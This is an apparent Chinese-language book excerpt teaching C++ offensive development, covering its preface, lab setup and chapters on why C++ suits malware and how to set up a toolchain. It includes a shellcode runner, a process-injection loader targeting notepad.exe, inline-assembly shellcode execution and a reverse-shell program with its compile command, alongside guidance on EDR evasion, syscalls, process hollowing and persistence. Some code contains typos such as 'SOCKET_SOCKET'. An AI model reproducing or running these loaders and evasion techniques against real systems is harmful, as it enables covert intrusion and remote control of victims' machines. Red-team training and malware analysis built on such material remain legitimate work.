# C++ 黑帽攻击：精通攻性编程、恶意软件工程与实战漏洞开发



![](img/cover.jpeg)




# 前言

# 关于本书

《C++ 黑帽黑客术》旨在网络安全专业人员、红队人员以及希望了解 C++ 如何用于攻性安全的恶意软件分析师。书中内容极具实战性，你会发现可以编译并运行的演示代码示例。

这不是一本关于通用 C++ 开发的书，而是一本关于攻性应用——特别是恶意软件模拟和漏洞研究的 C。

# 适合读者

本书专为技术丰富的读者设计，他们已具备 C++ 的基础到中等知识，并希望将其应用于攻性安全。它不是为编程完全初学者设计的。然而，如果你理解指针、内存分配以及基础 C++ 类的工作原理，你就能读懂代码并逐渐构建更复杂的工具。

本书对以下人群特别有用：

● 希望超越脚本工具并构建自定义载荷的渗透测试员和红队人员。
● 希望了解 C++ 恶意软件构造方式的反向工程师和恶意软件分析师。
● 需要低级性能和控制的安全研究人员和漏洞开发者。
● 希望通过编译开发扩展技能的网络安全学生或 CTF 参赛者。

如果你来自脚本背景（Python、PowerShell 或 Bash），本书将让你接触到编译 C++ 代码所提供的控制力和复杂性——这些技术通常处于杀毒软件、EDR 和行为检测系统的运行层面。

# 伦理使用免声明

书中的技术非常强大，误用可能导致危险。演示仅用于教育、伦理和研究目的。所有方法和代码示例都应在受控实验室环境中测试，严禁针对未经授权的系统。

未经许可的攻击是非法的。在生产系统、公司网络或非自己的设备上使用攻性工具违反了大多数国家的法律，包括美国计算机欺诈和滥用法（CFAA）、英国计算机滥用法以及欧洲、亚洲和非洲的各种网络法。

本书假设你是拥有适当授权进行攻性测试的专业、学生或研究人员。作者和出版商不认可也不支持非法黑客活动。在进行任何渗透测试或部署源自本书的代码之前，请务必获得明确许可。





# 实验环境建议

由于内容具有攻击性，所有实验和代码执行应在安全、隔离的实验环境中进行，该环境不应访问互联网或生产网络。在个人或工作设备上运行恶意软件或利用代码（即使是为了测试目的）也会带来严重风险。

为了创建一个安全且功能实验室：

- 使用 `VirtualBox`、`VMware` 或 `Hyper-V` 等虚拟化工具构建测试环境。
- 安装含有漏洞的操作系统，如 `Windows 10`、`Windows Server` 和 `Kali Linux`。
- 禁用网络桥接或设置内部网络，以防止任何工具访问互联网。
- 使用快照（snapshots）快速回滚虚拟机的状态。
- 使用 `Procmon`、`Wireshark`、`Process Hacker` 和 `Sysinternals Suite` 等工具监控系统行为。

创建一个安全的实验室不仅可以保护你的主机系统，还能让你自由地分析系统行为、测试持久化机制并开发真实的恶意软件行为，而无需担心后果。这也能训练你在真实的红队条件下工作，在这些情况下，隐蔽性、规避和观察是关键。

# 第 1 章 – 为什么 C++ 在攻击性安全中占据主导地位

C++ 一直是攻击性安全领域的主导语言，主要原因在于：控制。当你编写旨在绕过端点检测、直接操作内存或深度嵌入操作系统内核或进程空间的的工具时，你需要一种不会抽象掉系统的语言。C++ 为你提供了这种优势。它结合了 C 的速度和强大的抽象，使得复杂的工具开发变得易于管理。

在现代红队行动、恶意软件开发或利用程序编写中，大多数高影响的负载（payloads）仍然依赖于 C++，因为脚本语言无法满足深度隐蔽性、内存操作和原生 API 集成的要求。虽然 `Python` 或 `PowerShell` 非常适合快速自动化或侦察脚本，但它们无法提供根内核程序（rootkits）、加载器（loaders）或混淆 shellcode 执行所需的精确度和性能。当每一个字节和 `syscall` 都至关重要时，C++ 仍然是首选。

本章为为什么 C++ 在严肃的攻击性工作中至关重要奠定了基础。你将探索该语言为何独特适合黑客攻击、它如何在实际恶意软件中使用的、它在黑客工具链中与其他常见语言相比的情况如何，以及何时你应该选择 C++ 而不是其他选项。

## 1.1 C++ 的力量与灵活性

当你编写攻击性安全工具时，你真正需要的是控制。你需要确切知道你的代码在内存中如何行为、如何与操作系统交互，以及在执行所有设计功能的同时如何保持隐形——无论是注入 shellcode、绕过反病毒软件还是操作系统 API。C++ 通过原生力量与表达性语法的独特平衡赋予了你这种控制力。

在核心，C++ 赋予了你直接与内存交互的能力。你可以分配内存、覆盖内存、扫描进程空间，并以完全的精度操纵栈和堆分配。如果你试图构建一个在不向磁盘写入任何内容的情况下内存中运行负载的加载器，你需要这种控制。高级脚本语言根本无法做到。即使在像 `C#` 这样的语言中，你处理的也是垃圾回收环境和运行时，这些运行时在编写隐身工具时会添加你不想要的层级。但在 C++ 中，你和机器之间没有任何隔阂。

为了看到这种深度有多深，可以看下在 C++ 程序内部使用 `Windows API` 分配可执行内存并运行任意 shellcode 是多简单。这个示例创建了一个小型反向 shell 负载（已编码为字节数组）并在内存中执行它，而完全不接触磁盘。

```cpp
#include <windows.h>

#include <iostream>

// 实际 shellcode 的占位符。通常，你会用 msfvenom 或类似工具生成它。

unsigned char shellcode[] =

"\xfc\x48\x83\xe4\xf0\xe8..."; // 为了简洁进行了截断

int main() {

void* exec = VirtualAlloc(

nullptr,

sizeof(shellcode),

MEM_COMMIT | MEM_RESERVE,

PAGE_EXECUTE_READWRITE

);

if (exec == nullptr) {

std::cerr << "Failed to allocate memory." << std::endl;

return 1;

}

memcpy(exec, shellcode, sizeof(shellcode));

// 创建一个从 shellcode 处开始执行的新线程

HANDLE thread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)exec, nullptr, 0, nullptr);

if (thread == nullptr) {

std::cerr << "Failed to create thread." << std::endl;

return 1;

}

WaitForSingleObject(thread, INFINITE);

return 0;

}
```

这是一个为什么 C++ 在攻击性开发中如此有效的教科书级示例。它使用了 `VirtualAlloc` 等低级内存分配函数，将内存保护设置为可执行，使用 `memcpy` 将 shellcode 复制到其中，然后通过 `CreateThread` 运行它。没有中间脚本引擎。没有托管运行时。你直接针对 `Windows API` 进行编写。这种级别的控制让恶意软件能够保持不被检测，因为你决定了负载何时以及如何运行。

除了原始内存访问外，C++ 还赋予了你与原生 OS 特性的完全集成。如果你想与 `Windows Registry` 交互、挂钩 `Win32 APIs`、操作进程或注入 DLL，C++ 提供了你需要的一切。你可以使用微软提供的头文件构建行为完全像受信任应用程序的程序。这允许你的工具与合法软件混合，特别是当使用与原生 Windows 二进制文件相同的编译器选项进行编译时。

同样让 C++ 与众不同的是，它没有将你锁定在一种编程风格上。你可以像使用 `C` 一样使用过程化代码处理直接内存任务。在编写需要重用的恶意软件模块时，可以使用面向对象的模式，例如处理 `C2` 通的类或持久化插件管理器。你可以使用模板和编译时编程来混淆逻辑或生成负载的多态变。这种灵活性让你从小负载扩展到全功能的红队工具包——这一切都在同一种语言中完成。

如果你曾经在 `Ghidra` 或 `IDA` 中查看恶意软件样本，并注意到虚函数表、异常处理元数据以及运行时执行的构造函数和析构函数，你看到的很可能是 C++ 恶意软件。恶意软件作者使用 C++ 来跨模块构建复杂行为，同时保持有助于他们规避检测的底层特性。

一个真实的案例是 `PlugX` 或 `Gh0stRAT` 等工具的模块化架构。这些工具使用 C++ 构建并结构化组件——键盘记录器、屏幕捕捉模块、文件外泄程序——每个组件根据攻击者发送的命令动态加载。它们能够如此优雅地实现这一点是因为 C++ 支持复杂的类结构和多态，这允许将不同的行为封装在小型可交换对象中。

你还可以使用 C++ 在底层处理线程、套接字和系统调用。如果你想创建一个多线程命令控制代理，C++ 允许你通过 Windows 上的 `CreateThread` 或 Linux 上的 `pthread_create` 直接访问系统线程。这允许你精确控制插件的执行流，并同步不同的操作，如数据收集、加密和与远程服务器的通信——完全不依赖外部框架。





这意味着 C++ 既为你提供了编写内存精确 payload 的“外科手术工具”，也为你提供了将这些 payload 组织成可维护且可扩展架构的“架构工具”。这就是为什么在几十年后，它仍然是需要编写复杂代码的攻击者的首选语言。你不仅仅是在编写概念验证的 shellcode；你正在构建能够绕过检测、保持隐蔽性且在不被察觉的情况下持续运行的模块化工具。

因此，当你从攻性安全的视角来看 C++ 时，你看到的不仅仅是一门编程语言。你看到的是一个工具集，它让你拥有了一个精确、未经稀释的接口，通计算机运行的一切——以及一切可以被利用的东西。

## 1.2 用 C++ 编写的真实恶意软件和漏洞

如果你想认真理解现代恶意软件是如何运作的，那么研究实际威胁者如何使用 C++ 是至关重要的。这并非理论——人类发现的许多最具破坏性、最复杂的恶意软件家族都是用 C++ 编写的。原因很简单：C++ 在控制和结构之间提供了完美的平衡。它允许攻击者编写出高性能、隐蔽且模块化的代码，这些代码难以分析且易于扩展。

当像 Stuxnet（震网）这样的国家级恶意软件被发现时，逆向工程人员发现了一个用 C++ 编译的多阶段 payload。它不是一个带有硬编码逻辑单一文件，而是一组协同工作的模块化组件。Stuxnet 设计用于通过隐藏在显眼处并操控西门子 PLC 来攻击工业控制系统。让这种恶意软件脱颖而出的是其 C++ 代码的结构之良好。每个模块都有自己的职责——从权限提升到命令执行，再到注入特定服务。通过使用 C++，开发者可以在保持清晰架构的同时，仍然控制系统上每个字节的行为。

你会在 Duqu 和 Flame 等恶意软件中发现类似的故事。这些是专注于间谍活动的框架。它们不仅仅是用完即弃的二进制文件。它们拥有核心组件、插件、动态 payload 和加密通信系统。C++ 让这些模块能够更容易共享代码、抽象系统行为，并仍然能够作为原生 Windows 应用程序运行。如果你对像 Flame 这样的二进制文件使用 `Ghidra` 或 `IDA Pro` 进行分析，你将看到完整的类层次结构、构造函数链和虚函数表。这看起来像是在逆向工程一个商业应用程序——这并非巧合。攻击者希望他们的工具与合法软件融合在一起，而 C++ 让这不仅可能，而且非常高效。

另一个强有力的例子是 Emotet。虽然它作为银行木马闻名，但 Emotet 演变成了一个恶意软件即服务（MaaS）平台。它拥有加载器、通信模块和横移动组件——这些都是用 C++ 构建的。Emotet 背后的团队对其进行了优化，以绕过 Windows Defender，通过注册表集成持久性，并注入远程进程中。如果你追求隐蔽性和速度，你无法用 `Python` 或 `PowerShell` 完成这类工作。C++ 让你能够挂钩 `Windows API`、伪装你的进程，并在不写入磁盘的情况下从内存中执行 payload。这些是任何真实世界攻击场景的关键目标。

远程访问木马（RATs）如 `PlugX`、`Gh0stRAT` 和 `AsyncRAT` 也高度依赖 C++。这些工具通常允许攻击者查看桌面、控制鼠标、盗取文件并外泄数据。在许多情况下，二进制文件使用高级混淆技术编译。例如，`Gh0stRAT` 嵌入了自身的网络协议，并使用 C++ 管理数据包编码、命令解析和套接字通信。一个典型的 payload 将包含客户端和服务器组件，两者都用 C++ 编写，以确保受感染终端与攻击者系统之间的无缝执行、控制和同步。

即使是像 `Cobalt Strike` 这样的商业红队工具，底层也集成了 C++。虽然它的主脚本语言是 `Aggressor Script`，但许多红队人员使用用 C++ 编写的自定义后门植入和加载器（stagers）来扩展它。这些植入的设计旨在通过系统调用将 payload 直接嵌入进程内存，并带有极少的指示器来绕过杀毒软件。你在高级行动中看到的许多 `Beacon` payload 已经用 C++ 重写，以使检测更困难，且运行行为更具规避性。

你可能会奇怪，为什么恶意软件作者在这类工作中不坚持使用 `C` 或汇编。答案是，在 `C` 中编写大规模的可维护代码很快就会变得枯燥。没有类、没有命名空间、没有继承。你必须从零开始编写一切。汇编在这方面的限制甚至更大。虽然它对于 shellcode 或小型存根（stubs）很有用，但对于管理复杂的恶意软件逻辑来说是不现实的。

C++ 弥补了这一空白。你可以使用类和多态编写高层逻辑，同时仍然可以降到底层代码执行诸如注入线程、操作句柄或执行基于系统调用的直接执行。如果你正在编写一个需要持久、保持隐蔽并随时间演变的恶意软件框架或红队工具包，那么 C++ 就是带给你那份可维护优势的关键。

这是一个 C++ 加载器的基本示例，它使用进程注入在另一个进程内部运行 shellcode——这种技术被许多真实的恶意软件家族使用。这段代码片段特意保持简单以关注方法，但在实践中，这是无数植入物的骨干。

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

DWORD findProcessId(const std::wstring& processName) {
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &pe32)) {
        do {
            if (!processName.compare(pe32.szExeFile)) {
                CloseHandle(snapshot);
                return pe32.th32Process;
            }
        } while (Process32Next(snapshot, &pe32));
    }
    CloseHandle(snapshot);
    return 0;
}

int main() {
    DWORD pid = findProcessId(L"notepad.exe");
    if (!pid) {
        std::cerr << "找不到目标进程。" << std::endl;
        return 1;
    }
    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!process) {
        std::cerr << "无法打开进程。" << std::endl;
        return 1;
    }
    unsigned char payload[] = "\xfc\x48\x3..."; // shellcode 符
    SIZE_T payloadSize = sizeof(payload);
    void* alloc = VirtualAllocEx(process, nullptr, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(process, alloc, payload, payloadSize, nullptr);
    CreateRemoteThread(process, nullptr, 0, (LPTHREAD_START_ROUTINE)alloc, nullptr, 0, nullptr);
    CloseHandle(process);
    return 0;
}
```

这段代码扫描进程，定位 Notepad，将 shellcode 注入其内存，并在该进程中创建一个线程以执行 payload。它模拟了希望在信任进程中隐藏执行操作的恶意软件的行为。这种技术的变体在恶意软件家族中已使用了十年，如果经过适当混淆，它对许多防御工具仍然有效。

理解这些真实的恶意软件样本如何使用 C++ 不仅能帮助你构建更好的攻击工具，还能让你更有心地分析和逆向工程恶意二进制文件。你将识别模式，理解攻击者想要实现的目标，甚至编写你自己的工具来模拟这些行为，用于红队训练和防御测试。

当你读到一种新的恶意软件变种，且报告提到模块化、反分析、API 挂钩和自定义 C2 协议时——你可以打赌 C++ 一定其中。作为安全专业人员，匹配这种水平的唯一办法是掌握与攻击者所使用的相同的工具。

## 1.3 C++ 与 C、Python 和汇编在红队工作中的对比




当你为红队工具或攻性开发选择语言时，这不仅仅关乎你能写什么——更关乎代码行为的精确性和隐蔽性。每种语言在控制力、性能、开发速度和隐蔽性之间提供了不同的权衡。`C++`、`C`、`Python` 和 `Assembly` 在攻性工具链中各扮演着独特的角色，但它们并不是相互替代的。让我们诚实地从实战角度审视它们之间的对比。

当你需要编写必须原生执行、在隐蔽下运行且保持可维护性的有效负载（payloads）时，`C++` 通常是你的最佳选择。它赋予你与 `C` 相同的系统级资源访问权限，但具有更强的表达。你可以使用 `classes`、`templates`、`namespaces` 和 `operator overloading`（运算符重载），这些特性帮助你将复杂的行为组织成模块化组件。如果你正在构建一个支持文件外泄、持久化和插件动态加载等多种能力的恶意软件植入或 C2 代理，这一点至关重要。在 `C` 中，你需要用纯 `structs` 和 `function pointers` 来管理所有这些，这很快就会变得难以处理。在 `C++` 中，你可以创建一个类层次结构，每个功能都有清晰的结构，且交互也更容易管理。

以命令与控制（C2）模块为例。使用 `C++`，你可以为所有 C2 行为定义一个基类——也许是一个带有虚拟 `Execute()` 函数的抽象 `PayloadModule` 类。每个特定的模块（如文件窃取或截屏）都可以是一个子类。然后你可以动态加载模块，将它们存储在容器中并根据需要触发它们。这不仅仅是为了方便——更是为了编写可以在无需从头重写一切的情况下进化的恶意软件。大多数高级威胁者的操作都处于这种复杂程度的水平。

另一方面，`C` 更接近底层。它精简且快速，没有运行时开销，没有对象系统，除非你手动构建，否则没有抽象。这使得它非常适合编写 shellcode，因为其中每一个字节都至关重要。你可以精确地定义 CPU 执行的指令，并知道你的二进制文件的大小。但这种精确性是有代价的——你无法获得多态、内存安全容器或异常处理。你还必须自己管理内存，手动跟踪每一个指针，并在需要时使用 `structs` 和 `function pointers` 模拟面向对象的行为。

使用 `C` 的良好场景是编写尽可能紧凑的加载器节点（loader stubs）或后渗透脚本。例如，如果你正在构建一个反射 DLL 加载器或通过 `NtCreateThreadEx` 注入 shellcode，基于 `C` 的负载将保持轻量和简洁。许多如 `msfvenom` 或 `donut` 等负载生成器内部因此原因使用了 `C`。但一旦你的恶意软件需要更多结构——例如集成加密、持久化或完整的 C2 通信通道——`C` 在代码可维护性和重用性方面开始显示出其局限性。

`Python` 则是另一个故事。它易写、易读，并且在自动化和快速原型方面极其强大。它在侦察、漏洞扫描、凭据转储或使用 `Scapy` 等库编写自定义数据包负载的任务中表现优异。红队人员经常编写 `Python` 脚本来自动化横移动、启动钓鱼攻击或与 API 交互。但 `Python` 是解释型的，并且高度依赖宿主机环境。它需要 `Python` 解释器，会留下明显的取证痕迹，并且极易被逆向或反编译。它不是为了隐蔽而设计的。

尝试将 `Python` 加载到内存中、注入另一个进程，或使用直接系统调用链来绕过 EDR——这会非常杂乱。`Python` 的抽象本质和对大型标准库的依赖使得它不适合低级或隐蔽的负载。在 `Python` 中，如果不掉进 `C` 扩展或加载外部编译的二进制文件，没有简单的方法可以操作内存保护、修改栈或挂钩原生系统调用。

尽管如此，`Python` 仍然是攻性工作流的关键部分。你可能会用 `C++` 编写阶段工具以获取立足点，一旦攻破机器，在使用 `Python` 脚本执行后渗透任务。例如，在部署 `C++` 信标以获取远程代码执行后，你可以上传 `Python` 脚本来扫描内部网络或外泄特定文件。但在严肃的红队行动中，入口点——初始负载——永远不应该是 `Python`。

现在让我们谈谈 `Assembly`。`Assembly` 是你能够接近 CPU 的方式。你写的每条指令都对应一个真实的机器操作码。当你编写 shellcode、处理自定义系统调用或绕过用户态挂钩时，这是完美的。通过 `Assembly`，你可以构建出极其紧凑且可靠的负载。如果你试图编写一个系统调用存根以避免用户态 API 监控工具的检测，你将使用 `Assembly` 通过系统调用号直接调用 `NtWriteVirtualMemory` 或 `NtCreateThread`。你甚至可以剥离函数序言、内联加密并将多个阶段封装到单个连续缓冲区中。

缺点是 `Assembly` 难以维护、难以扩展且容易出错。即使是微小的 bug 也可能导致目标崩溃或产生导致暴露行踪的副作用。在 `Assembly` 中编写完整的 C2 客户端或加载器是可能的，但不实际。你最好在 `C` 或 `C++` 包装器内部嵌入短小的 `Assembly` 例程。这样，你可以在最关键的地方获得所需的控制——但仍然可以使用更安全、更高层次的语法来管理套接、加密和逻辑。

为了说明这一点，让我们来看一种混合方法。假设你正在编写一个能够分配内存、解密负载并运行它的加载器。你可能使用 `C++` 处理主逻辑——内存分配、文件 I/O 和命令行解析——然后插入一小段 `Assembly` 来执行到 `NtCreateThreadEx` 的系统调用。这种模式在无数恶意软件样本中被使用，因为它结合了汇编的力量和 C++ 的扩展性。

以下是在 C++ 中使用内联汇编实现这种方法的简化示意（仅 x86 示例，x64 MSVC 不支持）：

```cpp
void run_shellcode(unsigned char* shellcode) {
  __asm {
    mov eax, shellcode
    call eax
  }
}
```

虽然现代编译器和架构限制了内联汇编的使用，你仍然可以将外部 .asm 对象链接到你的 C++ 二进制文件中，或者用汇编编写系统调用封装并将其作为 C++ 函数。

在实践中，大多数专业的红队人员和恶意软件开发者使用分层方法。他们用 `C++` 编写植入和加载器，用 `C` 或 `Assembly` 编写负载和系统调用例程，并用 `Python` 进行编排、脚本和自动化。每种语言都有其优势。`C++` 提供了足够的抽象来保持代码易于管理，同时也提供了足够的访问权限来保持危险。这种平衡是很少其他语言能够提供的。




当你构建一个将 shellcode 注入内存并执行而不触碰磁盘的加载器（loader）时，脚本语言几乎会立即失效。它们过于抽象，会留下太多的特征，并且通常需要可能暴露你身份的解释器或依赖项。C++ 让你拥有对内存、执行流和进程交互的控制权，且没有任何依赖项。你编写一个二进制文件并编译它，它就能原生运行——没有解释器，没有依赖链，没有不是你亲手设置的数字指纹。

如果你正在编写一个需要在运行时解密负载（payload）、分配可执行内存并在当前或远程进程中启动它的释放器（dropper），C++ 让你可以直接访问 `VirtualAlloc`、`WriteProcessMemory` 和 `CreateRemoteThread` 等函数。这些是许多攻击链的核心，在规避端点防护时，能够在不使用托管封装或外部模块的情况下整洁地使用这些函数至关重要。

假设你需要通过计划任务、注册表项或由受信任应用程序加载的 DLL 在重启后持久化。在 C++ 中，你可以直接通过 `Windows API` 接口来创建该计划任务或写入注册表项。由于你编译的是原生二进制文件，你可以修改它的标头、封装负载并模拟合法可执行文件的结构——这极大地增加了规避检测的几率。

假设你的任务是构建一个红队植入体（implant），它可以连接到命令与控制服务器（C2），执行命令并报告结果。这个植入体需要体积小、快速、安静，并能够驻留在内存中。它还需要支持多个模块——文件浏览、键盘记录、屏幕截取等。使用 C++ 编写这些内容允许你使用类来定义一个整洁的结构。每个模块都可以派自公共基接口的类。在运行时，你的主循环可以根据收到的 `C2` 指令决定激活哪个模块。你不需要第三方库或高级框架来实现这一功能——你是在接近底层的方式进行构建。

例如，你的植入体可能有如下基类：

```cpp
class PayloadModule {
public:
    virtual void Execute() = 0;
    virtual ~PayloadModule() {}
};
```

而屏幕截获模块可以扩展它：

```cpp
class ScreenshotModule : public PayloadModule {
public:
    void Execute() override {
        // 屏幕截获的实现
    }
};
```

你可以在运行时动态加载此类，甚至可以在内存中加密类方法并在仅在需要时解密。这种程度的动态行为在脚本语言中很难实现，在 C 中没有必要，但在 C++ 中，它变得实用、可管理且高效高效。

当你的目标是带有 `EDR` 的加固环境时，你可能希望避免通过常规导入可疑的 `Windows API` 函数。相反，你可能在运行时使用函数哈值动态解析它们，甚至通过直接系统调用（syscalls）调用它们。在 C++ 中，你可以实现哈希逻辑，使用内联汇编或外部汇编存根进行系统调用，并控制精确的执行序列——同时将复杂性封装在可重用的代码中。

以进程镂空（process hollowing）作为另一个例子。如果你想以挂起状态启动一个合法进程，取消它的内存映射并替换为你自己的负载，你处理的是一系列低级 Windows 函数，如 `NtUnmapViewOfSection`、`VirtualAllocEx`、`WriteProcessMemory` 和 `SetThreadContext`。在 C++ 中执行这些操作允许你以最小的开销编写一个隐蔽、可靠的释放器。你可以为每个系统调用封装错误处理、日志记录和混淆——并在一个自成包含的二进制文件中完成所有这些。

在威胁模拟或攻击者模拟工作中，你的工作可能涉及复制已知的攻击者行为。如果特定的 APT 使用反射 DLL 注入或线程上下文劫持，你被要求准确地复制它。C++ 是唯一允许你完全匹配这些技术复杂性和隐蔽性的语言。你甚至可以通过检查 `VM` 伪迹或根据 CPU 指令或系统计数器延迟执行来模拟沙箱逃逸——这一切都在单个 C++ 函数内部完成。

你起初可能会认为使用脚本语言会帮助你移动更快。在某些早期的侦察任务中确实如此。但当你的负载必须在受监控环境中生存、执行内存操作、隐藏在另一个进程中并规避行为检测时，这些语言就失效了。C++ 才是真正工作的地方。它让你对内存、线程、执行流和系统调用拥有控制。它让你能够构建模块化、加密且难以逆向的负载。它带给你没有抽象带来的速度、不妥协的隐蔽性以及不沉重的结构。

这就是你使用 C++ 的时机——当你构建的工具需要像恶意软件一样运行，而不仅仅看起来像概念演示时。当你写的每一行代码都会内存中产生后果时。当系统正在监控你，而你仍然需要胜利时。

# 第 2 章 – 设置 C++ 攻击性开发环境

在编写 C++ 恶意软件加载器、自定义植入体或 shellcode 注入器之前，你需要配置好环境。C++ 攻击性开发与日常编程不同——你的目标不仅仅是让程序运行。你的目标是让程序安静地、隐蔽地在目标系统上运行且不被发现。这意味着你不仅是在构建代码，你还在像攻击者那样构建它，并在尽可能模拟真实目标环境环境中对其进行测试。

本章将引导你完成完成为攻击性 C++ 工作设置一个可靠且安全的开发环境所需的所有工作。你将探索根据目标操作系统哪些工具链效果最好，如何选择合适的编译器和调试器，如何配置 `Visual Studio` 或 `MinGW` 以编译整洁精简的二进制文件、对静态和动态分析工具的预期，以及如何构建一个让你安全测试危险代码的恶意软件实验室。

## 2.1 选择正确的工具链（Windows, Linux）

如果你为攻击性操作编写 C++，你选择的工具链将直接影响代码的行为、可检测性，以及它是否在目标机器上正常运行。你不仅仅是在编译软件——你正在制作模拟真实恶意软件行为的二进制文件。因此，工具链不是无关紧要的细节。它是你在保持隐蔽性、性能和可靠性的同时，构建、测试和部署恶意功能的基础。

让我们从问题开始：你的目标是什么平台——Windows 还是 Linux？这决定了你将调用的 API、产生的二进制格式以及你的代码需要复制的行为。虽然许多现代红队行动关注 Windows 负载，但对目标 Linux 服务器和容器化基础设施的兴趣也日益增长。无论如何，你都必须选择支持你目标的编译器、链接器和构建工具的正确组合。




如果你关注的目标是 Windows 平台——在攻击性安全中通常如此——那么你的工具链必须能够生成原生 PE 二进制文件，这些文件可以使用完整的 Windows API。这包括诸如 `CreateRemoteThread`、`VirtualAllocEx` 等调用，甚至在追求隐蔽性时使用诸如 `NtOpenProcess` 这种未公开的系统调用。这里的行业标准工具是使用 `MSVC` 编译器的 `Microsoft Visual Studio`。它与 `Windows SDK` 深度集成，让你能够访问与 Windows 内部交互所需的所有头文件和库，并支持静态链接和编译器级优化等高级编译器选项。通过 `MSVC`，你可以编译出结构和特征上看起来与企业软件完全相同的恶意软件。你可以控制从子系统标志到节区对齐的所有内容，从而精确控制系统和安全工具如何解释你的有效负载（payload）。

然而，当你正在构建小型、高度混淆的加载器（loaders）或反射 DLL 时，`Visual Studio` 并不总是你的最佳选择。在这种情况下，`MinGW-w64` 提供了更大的灵活性，通常生成的二进制文件更小且依赖项更少。你可以从 Linux 进行交叉编译，使用 `ld` 和 `objcopy` 手动处理头文件，并使用 `strip` 完全剥离调试符号。该工具链在你想要绕过标准链接行为或完全避免 CRT 初始化时通常更具包容性——这对于构建 shellcode 安全型（shellcode-safe）代码非常有帮助。它支持与 `WinAPI` 函数直接链接，除非你明确要求，否则不会添加额外的 `Visual C++` 运行时依赖。

在 Linux 端，情况要容易预测得多。大多数有效负载使用 `g++` 或 `clang++` 编译，目标二进制格式始终是 `ELF`。你可以通过 `unistd.h`、`sys/mman.h` 或直接调用 `syscall()` 使用标准的系统调用。Linux 工具链精简且透明，这使得编写与内存、文件描述符、网络套接字甚至内核模块交互的演示代码变得更容易。

但这里是背景的关键。如果你正在编写一个需要持久化或与 init 脚本、日志轮或 SSH 守护进程交互的 Linux 植入，使用与系统服务相同的工具链来构建它将让你受益。这通常意味着使用 `gcc` 编译并链接到 `glibc`。如果你试图构建一个从内存运行且不留痕迹的微型释放器（dropper），你可能倾向于使用 `musl` 进行静态链接，甚至使用 `nasm` 构建原始的位置无关 shellcode，并用用 `C++` 编写的自定义加载器将其链接。

在许多红队行动中，你会遇到这样的场景：在一个平台上开发和测试有效负载，而在另一个平台上部署。这就是交叉编译变得至关重要的地方。通过在 Linux 上安装 `mingw-w64` 等工具，你无需启动 Windows 即可编译 Windows PE 可执行文件。这允许你将攻击工具集成到 CI 流水线、自动化测试环境或基础即代码平台——而无需依赖 Windows 设备。你可以使用简单的 `Makefile` 直接从 Linux 生成 `DLLs`、`EXEs` 和适用于 shellcode 的二进制文件。

为了给你一个运行示例，这里有一个用 `C++` 编写并使用 `MinGW` 为 Windows 编译的最小反向 shell 负载：

```cpp
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in target;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == SOCKET_SOCKET) return 1;

    target.sin_family = AF_INET;
    target.sin_port = htons(4444);
    target.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (connect(sock, (struct sockaddr*)&target, sizeof(target)) != 0) return 1;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    return 0;
}
```

编译此代码，使用：
```bash
x86_64-w64-mingw32-g++ reverse.cpp -o reverse.exe -lws2_32 -s
```

## 2.2 编译器、调试器和反汇编器

如果你认真地使用 `C++` 进行攻击性开发，你的工作流并不止于编写。它一直延伸到编译、测试和分析。你使用的编译器决定了二进制文件的行为。调试器帮助你跟踪执行过程。反汇编器向你展示防御者——以及逆向工程师——将会看到。因此，在这里选择并使用正确的工具并非可选，它是编写真正有效代码的基础。




`Clang` 提供了另一层面的灵活性，特别是对于跨平台构建。它的诊断信息更加整洁，并且支持中间表示（`IR`），可以对代码进行操作以实现混淆或变换。某些红队人员使用 `Clang` 生成 `LLVM IR`，并在转换为最终二进制文件之前应用自定义的 Pass（passes）进行混淆。这种工作流增加了复杂性，但也为你提供了一种规避寻找常见指令模式的基于特征检测引擎的方法。

一旦你的二进制文件编译完成，你需要一种方法在执行期间对其进行单步。这就是良好的调试器大显身手的地方。如果你在 Windows 上，`x64dbg` 是你可以使用的最强大的工具之一。它支持断点、内存查看、指令追踪和插件扩展。你可以加载二进制文件，观察它在内存中自行解压，并单步进入注入线程。如果你的加载器（loader）崩溃，或者你注入的 shellcode 静默失败了，`x64dbg` 将允许你实时监控堆分配、线程创建和内存写入。

对于更高级的内核工作，你可能会转向 `WinDbg`，它是 Windows SDK 的一部分。它是为了深度分析设计的，特别是为了调试驱动程序或 ring-0 代码。如果你正在尝试基于驱动的持久化或根基工具（rootkit）开发，这可能是你花费时间最多的的地方。

在 Linux 上，标准的调试器是 `gdb`。它并不华丽，但功能强大且可脚本。你可以设置断点、观察变量、追踪函数调用并分析崩溃。如果你正在构建基于 ELF 的植入体（implants）或编写使用了 `mmap`、`fork` 或 `execve` 的加载器代码，`gdb` 将帮助你单步执行代码在 Linux 主机上显示的精确行为。结合 `strace` 或 `ltrace` 等工具，你就可以获得系统调用行为和库调用追踪的全景。

但调试只是了一半。一旦代码编译完成，你还需要看到它在试图进行静态分析的人眼中看起来是什么样。这就是反汇编器的用武之地。如果你在进行攻击性开发，你应该使用反汇编器在任何人之前检查你自己的载荷（payload）。因为如果不这样做，别人就会这样做。

`IDA Pro` 长期以来一直是行业标准，尽管免费版限制更多。它为你提供二进制文件的完整反汇编，重构函数图，甚至尝试恢复 C 风格的伪代码。如果你的载荷仍然包含如 `"CreateRemoteThread"` 或 `"cmd.exe"` 等字符串，`IDA` 会发现它们。任何蓝队分析师也会发现。

`Ghidra` 是美国国家安全局（NSA）提供的一个强大的免费替代方案，提供了与 IDA 类似的功能——包括反编译视图、交叉引用、函数识别和补丁（patching）。它不仅适用于分析恶意软件，还适用于检查你自己的二进制文件，以查看你的函数名、控制流和字符串有多明显。

